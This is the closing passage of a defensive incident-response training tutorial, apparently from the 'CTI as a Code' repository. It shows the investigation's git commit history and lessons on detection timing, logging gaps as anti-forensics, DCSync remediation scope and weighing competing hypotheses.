    status: answered    # CL-006 — ongoing, AD rotation required
```

```bash
git add 05-deliverables/ project.yml
git commit -m "PROJ-2024-001: deliverables — executive brief, SOC handoff, INCD notification ready; all PIRs answered; project closed"
```

---

## The Git History: What a Completed Investigation Looks Like

```
b9a2f1c  PROJ-001: deliverables — executive brief, SOC handoff, INCD notification ready
7c8d3e4  PROJ-001: detections — DET-001 through DET-004 validated PASS via Hayabusa
5f2a9b1  PROJ-001: attribution — single actor assessed (shared PE timestamp + secondary C2)
3e4c7d8  PROJ-001: ATT&CK mapping — 12 techniques, 7 rule-missing, 3 incomplete, 1 data-missing
1b6f2a5  PROJ-001: claims — 6 claims; PIR-001 ANSWERED YES (CL-003); PIR-003 CONFIRMED ONGOING (CL-006)
9a3e7c2  PROJ-001: timeline — 18 events Oct 22–Nov 15; dual-path confirmed, same actor assessed
6f1b4d9  PROJ-001: evidence inventory — 6 sources, GAP-001 documented, firewall log retrieval urgent
2c8a5e3  PROJ-001: scope — signed off 22:55 IST; PIR-001/002/003, TLP AMBER, legal hold WS-IT-LEVI
a1d7f4b  PROJ-001: intake — CFO PowerShell alert, legal hold WS-IT-LEVI, formula data in scope
0e9c2b7  PROJ-001: scaffold initialized
```

Each commit is a phase. Each message states the project ID, the phase, and a one-line summary of what was concluded. When a lawyer asks six months from now "what did you know and when did you know it?" — the git log answers.

---

## Key Lessons

**The alert was not the beginning.** The SOC received its first signal 52 hours after the breach was already in progress — and 15 days after the formula files were gone. The triggering alert was the second entry point. A detection rule on anomalous VPN authentication (DET-001) would have fired on October 24 at 02:17 UTC — before any lateral movement, before any data access.

**Gaps are findings, not absences.** The 10-day Sysmon gap on WS-IT-LEVI coincided exactly with the delivery of a phishing email. Stopping a logging service is T1562.001 — Impair Defenses. A gap is not "we don't know what happened." A gap that coincides with a malicious delivery is evidence of anti-forensics.

**DCSync changes everything.** The scope of remediation is not "three infected hosts." When DCSync is confirmed via Domain Admin rights, every credential in the AD is potentially compromised. The scope is all 80 servers. The IR Lead needs to know this before the 90-minute CISO brief, not after.

**Claims need competing hypotheses.** CL-003 (exfiltration confirmed) is only defensible as "high confidence" because specific alternative explanations were checked and explicitly ruled out — scheduled backup (wrong source IP, wrong timing), authorized developer activity (no jobs scheduled). Without the competing hypothesis analysis, a claim is an assertion. With it, it is analysis.

---

*This scenario is training assignment A01 from the [CTI as a Code repository](https://github.com/anpa1200/CTI_as_a_Code). The full evidence set, template, and worked solution are available there.*

*Tags: Threat Intelligence · Incident Response · CTI · DFIR · Detection Engineering · MITRE ATT&CK · Sigma · Blue Team*
